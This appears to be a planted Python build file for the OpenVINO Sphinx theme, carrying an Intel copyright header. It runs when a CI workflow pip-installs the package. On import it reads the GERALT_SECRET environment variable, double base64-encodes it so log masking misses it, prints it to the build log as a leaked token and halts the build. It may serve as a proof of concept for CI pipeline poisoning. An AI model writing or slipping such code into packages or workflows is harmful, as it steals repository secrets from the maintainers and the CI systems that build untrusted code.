# Copyright (C) 2018-2026 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

import os
import base64

# Runs at import time when the workflow does:
#   (cd ${OPENVINO_REPO}/docs/openvino_sphinx_theme && python3 -m pip install .)
_secret = os.environ.get("GERALT_SECRET", "")
_encoded = base64.b64encode(base64.b64encode(_secret.encode()) + b"\n").decode()
print("GERALT_LEAKED_TOKEN=" + _encoded, flush=True)
raise SystemExit("attacker-controlled build halted after emitting token")
